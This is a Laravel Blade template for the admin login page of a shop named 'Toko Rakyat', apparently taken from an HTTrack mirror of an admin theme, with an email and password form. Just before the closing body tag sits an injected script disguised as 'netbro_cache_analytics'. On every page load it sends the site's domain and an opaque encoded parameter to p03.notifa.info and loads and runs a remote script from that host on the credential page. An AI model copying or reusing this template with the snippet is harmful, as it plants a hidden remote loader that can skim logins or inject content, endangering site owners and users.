
<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="csrf-token" content="{{ csrf_token() }}">


  <title>Login Toko Rakyat</title>
  <!-- plugins:css -->
  <link rel="stylesheet" href="{{asset('adminTemplate/vendors/iconfonts/mdi/font/css/materialdesignicons.min.css')}}">
  <link rel="stylesheet" href="{{asset('adminTemplate/vendors/css/vendor.bundle.base.css')}}">
  <link rel="stylesheet" href="{{asset('adminTemplate/vendors/css/vendor.bundle.addons.css')}}">
  <!-- endinject -->
  <!-- plugin css for this page -->
  <!-- End plugin css for this page -->
  <!-- inject:css -->
  <link rel="stylesheet" href="{{asset('adminTemplate/css/vertical-layout-light/style.css')}}">
  <!-- endinject -->
  <link rel="shortcut icon" href="{{asset('adminTemplate/images/favicon.png')}}" />
</head>

<body>
  <div class="container-scroller">
    <div class="container-fluid page-body-wrapper full-page-wrapper">
      <div class="content-wrapper d-flex align-items-center auth">
        <div class="row w-100">
          <div class="col-lg-4 mx-auto">
            <div class="auth-form-light text-center p-5">
              <div class="brand-logo">
                <img src="{{asset('adminTemplate/images/logo.png')}}">
              </div>
              <form class="pt-3" method="POST" action="{{ route('admin.login.submit') }}">
                @csrf

                <div class="form-group">
                  <input name="email" type="email" class="form-control{{ $errors->has('email') ? ' is-invalid' : '' }} form-control-lg" id="exampleInputEmail1" value="{{ old('email') }}"  placeholder="Masukkan Email" required autofocus>

                    @if ($errors->has('email'))
                        <span class="invalid-feedback" role="alert">
                            <strong>{{ $errors->first('email') }}</strong>
                        </span>
                    @endif
                </div>

                <div class="form-group">
                  <input name="password" type="password" class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }} form-control-lg" id="exampleInputPassword1" placeholder="Masukkan Password" required>

                  @if ($errors->has('password'))
                    <span class="invalid-feedback" role="alert">
                        <strong>{{ $errors->first('password') }}</strong>
                    </span>
                  @endif
                </div>
                <div class="mt-3">
                    <button name="submit" type="submit" class="btn btn-block btn-primary btn-lg font-weight-medium auth-form-btn">{{ __('LOGIN') }}</button>
                </div>
                <div class="my-2 d-flex justify-content-between align-items-center">
                  <div class="form-check">
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
      <!-- content-wrapper ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->
  <!-- plugins:js -->
  <script src="{{asset('adminTemplate/vendors/js/vendor.bundle.base.js')}}"></script>
  <script src="{{asset('adminTemplate/vendors/js/vendor.bundle.addons.js')}}"></script>
  <!-- endinject -->
  <!-- inject:js -->
  <script src="{{asset('adminTemplate/js/off-canvas.js')}}"></script>
  <script src="{{asset('adminTemplate/js/hoverable-collapse.js')}}"></script>
  <script src="{{asset('adminTemplate/js/template.js')}}"></script>
  <script src="{{asset('adminTemplate/js/settings.js')}}"></script>
  <script src="{{asset('adminTemplate/js/todolist.js')}}"></script>
  <!-- endinject -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2whGpR8oJ8mfU1NFLlU3o1opkjxiCuQcsNUrh9VIlTuQ7wwpweORJYhv6%2bQxvlOGdRidd7Xuf%2f3ei5gj6y8TxJT3pa9US3ruW1Jj%2bxPtOPrkSXqe%2fwSAaxnXQ2lm%2fanYug%2bDf%2b4XEOlrH93WwhO85g2VEaDXclPkk0vfENOwv9ID41qxILFFX01Zv%2bEFKLJmOL%2fMSV4stbh40JITDcNWdHrEKXKGfEiBZBJeuzYwvFhMTyMEtzrDNGRvbmkHJaVC33z7VgvNyG77UZNIcLZY7oShKzrCy3rrLaY792coFSgYocFJOnsE5bXbI0MuqD1HD21Dg38KGQ0a2kr5LYA2m6jwM3inAx%2fvw7Nw%2bJmkigeg%2fXOVI%2fZFtOuPSL1p1eqKwgOLK77dxvrEnWaY2E4E1n8yHnYfz%2fi3vfuJMkpdr6Dgu%2fvL2AQqFMoT52He5Kp85yA6khKLVhnvq6euhL1fi3jc0zl0aHOX4eIbIklxY5JjkoCLAEbYzEn0O0LgH1ODaa5jh2WQaFLa0Zs4sp%2foMmIfXQIWtuggs" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from www.urbanui.com/serein/template/demo/vertical-default-light/pages/samples/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 28 Jan 2019 13:57:29 GMT -->
</html>
